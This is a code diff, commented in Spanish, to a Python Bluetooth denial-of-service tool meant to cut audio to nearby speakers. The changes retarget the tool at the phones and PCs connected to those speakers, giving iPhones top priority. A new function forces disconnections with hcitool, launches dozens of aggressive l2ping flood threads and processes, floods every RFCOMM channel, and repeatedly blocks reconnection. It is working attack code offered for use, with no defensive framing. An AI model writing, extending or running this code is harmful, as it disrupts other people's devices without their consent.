@@ -78,6 +78,33 @@ attack_only_audio_devices = True  # Solo atacar dispositivos de audio identifica
 exclude_ble_from_classic_attacks = True  # No atacar BLE con L2CAP/RFCOMM
 attack_delay_between_devices = 3  # Segundos de delay entre cada dispositivo (evitar saturación)
 
+# ESTRATEGIA DE ATAQUE: Atacar FUENTE DE AUDIO (teléfonos/PCs) no parlantes
+attack_connected_source = True  # Atacar dispositivo CONECTADO al parlante (iPhone, Android, PC)
+prioritize_phones_over_speakers = True  # Priorizar atacar teléfonos sobre parlantes directamente
+
+# ===== DICCIONARIO DE DISPOSITIVOS FUENTE (Teléfonos, PCs, Tablets) =====
+# Estos dispositivos suelen estar CONECTADOS a los parlantes
+SOURCE_DEVICE_KEYWORDS = [
+    # Apple devices (iPhone, iPad, Mac)
+    'iphone', 'ipad', 'macbook', 'imac', 'mac mini', 'mac pro',
+    'airpods', 'apple', 'ios', 'macos',
+
+    # Android phones
+    'galaxy', 'pixel', 'oneplus', 'xiaomi', 'redmi', 'poco',
+    'huawei', 'honor', 'oppo', 'vivo', 'realme', 'motorola',
+    'nokia', 'asus', 'sony xperia', 'lg phone', 'htc',
+
+    # Generic phone names
+    'phone', 'smartphone', 'móvil', 'celular', 'android',
+
+    # PCs and Laptops
+    'pc', 'laptop', 'notebook', 'desktop', 'computer',
+    'windows', 'linux', 'ubuntu', 'thinkpad', 'dell', 'hp',
+
+    # Tablets
+    'tablet', 'tab', 'surface',
+]
+
 # ===== DICCIONARIO DE DISPOSITIVOS DE AUDIO =====
 # Palabras clave que identifican parlantes/speakers en nombres de dispositivos
 AUDIO_DEVICE_KEYWORDS = [
@@ -279,12 +306,45 @@ def is_audio_device(device):
 
     return False
 
+def is_source_device(device):
+    """
+    Determina si un dispositivo es una FUENTE de audio (teléfono, PC, tablet)
+    que probablemente esté CONECTADO a un parlante.
+
+    Args:
+        device: Diccionario con información del dispositivo
+
+    Returns:
+        bool: True si el dispositivo es una fuente (iPhone, Android, PC)
+    """
+    device_name = (device.get('name') or '').lower()
+
+    # Verificar nombre contra keywords de fuentes
+    if device_name:
+        for keyword in SOURCE_DEVICE_KEYWORDS:
+            if keyword.lower() in device_name:
+                return True
+
+    # Verificar clase del dispositivo (teléfonos, PCs)
+    device_class = device.get('class', None)
+    if device_class is not None:
+        # 0x02 = Phone (cualquier subcategoría)
+        # 0x01 = Computer (cualquier subcategoría)
+        major_class = (device_class >> 8) & 0x1F
+        if major_class == 0x02:  # Phone
+            return True
+        if major_class == 0x01:  # Computer/Desktop/Laptop
+            return True
+
+    return False
+
 def filter_attack_targets(all_devices):
     """
     Filtra y prioriza dispositivos para atacar basado en:
-    1. Si attack_only_audio_devices=True, solo retorna dispositivos de audio
-    2. Excluye dispositivos BLE de ataques Classic si exclude_ble_from_classic_attacks=True
-    3. Limita a max_simultaneous_attacks dispositivos
+    1. PRIORIDAD: Dispositivos FUENTE (iPhones, teléfonos, PCs) que están conectados a parlantes
+    2. Fallback: Dispositivos de audio (parlantes) directamente
+    3. Excluye dispositivos BLE de ataques Classic si exclude_ble_from_classic_attacks=True
+    4. Limita a max_simultaneous_attacks dispositivos
 
     Args:
         all_devices: Lista de diccionarios con dispositivos detectados
@@ -295,9 +355,18 @@ def filter_attack_targets(all_devices):
     filtered = []
 
     for device in all_devices:
-        # Si solo queremos audio, filtrar
+        # ESTRATEGIA: Priorizar atacar FUENTES (iPhones/teléfonos) sobre parlantes
+        is_source = is_source_device(device)
+        is_audio = is_audio_device(device)
+
+        # Si priorizamos fuentes Y encontramos una fuente → INCLUIR SIEMPRE
+        if prioritize_phones_over_speakers and is_source:
+            filtered.append(device)
+            continue
+
+        # Si solo queremos audio, filtrar (pero permitir fuentes si están habilitadas)
         if attack_only_audio_devices:
-            if not is_audio_device(device):
+            if not is_audio and not (attack_connected_source and is_source):
                 continue
 
         # Si excluimos BLE de ataques Classic
@@ -317,9 +386,18 @@ def filter_attack_targets(all_devices):
         score = 0
         dev_name_lower = (dev.get('name') or '').lower()
 
-        # PRIORIDAD MÁXIMA: Astronaut Speaker (siempre atacar primero)
+        # ⭐ PRIORIDAD ABSOLUTA: Dispositivos FUENTE (iPhone, teléfonos, PCs)
+        # Estos son los que están CONECTADOS a los parlantes
+        if is_source_device(dev):
+            score += 2000  # MÁXIMA PRIORIDAD: Atacar la fuente, no el parlante
+
+            # Bonus si es iPhone específicamente (objetivo principal)
+            if 'iphone' in dev_name_lower:
+                score += 500  # iPhone 15 del usuario
+
+        # PRIORIDAD SECUNDARIA: Astronaut Speaker (solo si no hay fuentes)
         if 'astronaut' in dev_name_lower:
-            score += 1000  # Astronaut Speaker es el objetivo principal
+            score += 1000
 
         # Prioridad 1: Tiene nombre conocido
         if dev.get('name', 'Unknown') != 'Unknown':
@@ -359,16 +437,33 @@ def log_device_filtering(all_devices, filtered_devices):
     classic_count = sum(1 for d in all_devices if not d.get('is_ble', False))
     ble_count = sum(1 for d in all_devices if d.get('is_ble', False))
     audio_count = sum(1 for d in all_devices if is_audio_device(d))
+    source_count = sum(1 for d in all_devices if is_source_device(d))
 
     log_message += f"[*] Classic: {classic_count}, BLE: {ble_count}\n"
-    log_message += f"[*] Dispositivos de audio: {audio_count}\n"
+    log_message += f"[*] Dispositivos de audio (parlantes): {audio_count}\n"
+    log_message += f"[*] Dispositivos fuente (iPhones/PCs): {source_count}\n"
     log_message += f"[*] Seleccionados para ataque: {len(filtered_devices)}\n"
 
     if len(filtered_devices) > 0:
         log_message += f"[*] Objetivos:\n"
         for dev in filtered_devices:
             dev_type = "BLE" if dev.get('is_ble', False) else "Classic"
-            log_message += f"    - {dev['addr']} ({dev.get('name', 'Unknown')}) [{dev_type}]\n"
+
+            # Identificar si es FUENTE o PARLANTE
+            if is_source_device(dev):
+                device_role = "⭐ FUENTE (iPhone/PC) ⭐"
+            elif is_audio_device(dev):
+                device_role = "PARLANTE"
+            else:
+                device_role = "Otro"
+
+            log_message += f"    - {dev['addr']} ({dev.get('name', 'Unknown')}) [{dev_type}] → {device_role}\n"
+
+        # Indicar estrategia
+        if any(is_source_device(d) for d in filtered_devices):
+            log_message += f"\n[⭐] ESTRATEGIA: Atacar FUENTE para cortar conexión al parlante\n"
+        else:
+            log_message += f"\n[*] ESTRATEGIA: Atacar parlantes directamente (no se detectó fuente)\n"
 
     log_message += f"[*] =====================================\n"
 
@@ -1229,6 +1324,98 @@ def attack_a2dp_avdtp(device_addr):
     except Exception as e:
         pass
 
+def attack_source_device(device_addr, device_name):
+    """
+    Ataque ESPECÍFICO a dispositivos FUENTE (iPhones, teléfonos, PCs).
+    Objetivo: CORTAR LA CONEXIÓN con el parlante.
+
+    Estrategia diferente a atacar parlantes:
+    1. Desconexión forzada de conexiones activas
+    2. L2CAP flooding extremadamente agresivo
+    3. Bloqueo de reconexión
+    4. Ataque continuo a la pila Bluetooth del dispositivo
+    """
+    global bt_interface, l2ping_threads_per_device, l2ping_package_sizes
+
+    print(f"[⭐] ATAQUE A FUENTE: {device_addr} ({device_name}) via {bt_interface}")
+    print(f"[⭐] Objetivo: CORTAR CONEXIÓN con parlante")
+    writeLog(f"ATAQUE A FUENTE (iPhone/PC): {device_addr} - {device_name}")
+
+    attack_thread_list = []
+
+    try:
+        # ===== 1. DESCONEXIÓN FORZADA DE CONEXIONES ACTIVAS =====
+        print(f"[*] Intentando desconexión forzada de conexiones activas...")
+        try:
+            # Intentar desconectar todas las conexiones activas del dispositivo
+            subprocess.run(
+                ['hcitool', '-i', bt_interface, 'dc', device_addr],
+                timeout=2,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        except:
+            pass
+
+        # ===== 2. L2CAP FLOODING EXTREMADAMENTE AGRESIVO =====
+        # Duplicar threads para fuentes (más agresivo que parlantes)
+        source_threads = l2ping_threads_per_device * 2  # 40 threads
+        print(f"[*] Lanzando {source_threads} threads de l2ping (AGRESIVO)...")
+
+        for i in range(source_threads):
+            package_size = l2ping_package_sizes[i % len(l2ping_package_sizes)]
+            thread = threading.Thread(
+                target=attack_l2ping_thread,
+                args=(device_addr, package_size, i),
+                daemon=True
+            )
+            thread.start()
+            attack_thread_list.append(thread)
+            time.sleep(0.005)  # 5ms entre lanzamientos (más rápido)
+
+        # ===== 3. RFCOMM FLOODING MASIVO =====
+        print(f"[*] Atacando canales RFCOMM del dispositivo fuente...")
+        for channel in range(1, 31):  # Todos los canales RFCOMM
+            thread = threading.Thread(
+                target=attack_rfcomm_channel,
+                args=(device_addr, channel),
+                daemon=True
+            )
+            thread.start()
+            attack_thread_list.append(thread)
+            time.sleep(0.005)
+
+        # ===== 4. BOMBARDEO CONTINUO CON L2PING EN BACKGROUND =====
+        # Más procesos en background para fuentes
+        for i in range(20):  # 20 procesos adicionales (vs 10 para parlantes)
+            try:
+                subprocess.Popen(
+                    ['l2ping', '-i', bt_interface, '-s', '600', '-f', device_addr],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+            except:
+                pass
+
+        # ===== 5. BLOQUEO DE RECONEXIÓN =====
+        # Intentar bloquear que el dispositivo se reconecte
+        print(f"[*] Bloqueando reconexión del dispositivo fuente...")
+        for i in range(5):
+            try:
+                subprocess.Popen(
+                    ['hcitool', '-i', bt_interface, 'dc', device_addr],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+            except:
+                pass
+
+        print(f"[+] Ataque FUENTE activo con {len(attack_thread_list)}+ threads")
+        print(f"[⭐] Esperando corte de audio del parlante...")
+
+    except Exception as e:
+        print(f"[!] Error en ataque a fuente: {e}")
+
 def attack_device(device_addr, device_name):
     """Ataca un dispositivo con TODOS los métodos en PARALELO - Máxima agresividad"""
     global bt_interface, l2ping_threads_per_device, l2ping_package_sizes
@@ -1329,9 +1516,19 @@ def continuous_attack():
                 print(f"{'='*60}")
                 writeLog(f"ATAQUE INDIVIDUAL {i+1}/{len(filtered_devices)}: {device['addr']} - {device.get('name', 'Unknown')}")
 
+                # ===== SELECCIONAR ESTRATEGIA DE ATAQUE =====
+                # Si es FUENTE (iPhone/teléfono) → usar attack_source_device()
+                # Si es PARLANTE → usar attack_device()
+                if is_source_device(device):
+                    print(f"[⭐] Dispositivo identificado como FUENTE - Usando ataque de desconexión")
+                    attack_function = attack_source_device
+                else:
+                    print(f"[*] Dispositivo identificado como PARLANTE - Usando ataque directo")
+                    attack_function = attack_device
+
                 # Lanzar thread de ataque y ESPERAR a que termine (o timeout de 15 segundos)
                 thread = threading.Thread(
-                    target=attack_device,
+                    target=attack_function,
                     args=(device['addr'], device.get('name', 'Unknown')),
                     daemon=True
                 )
